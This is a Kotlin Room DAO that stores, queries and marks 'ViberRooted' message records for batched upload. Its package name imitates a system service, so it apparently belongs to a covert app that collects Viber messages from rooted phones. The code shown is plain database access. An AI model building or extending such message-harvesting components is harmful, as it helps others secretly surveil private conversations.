package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.ViberRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface ViberRootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(ViberRooted: List<ViberRooted>)

    @Query("Select * from viber_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllViberRootedMessages(status: Int): List<ViberRooted>

    @Query("Update viber_rooted set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from viber_rooted")
    fun selectMaxTimeStamp(): Long?
}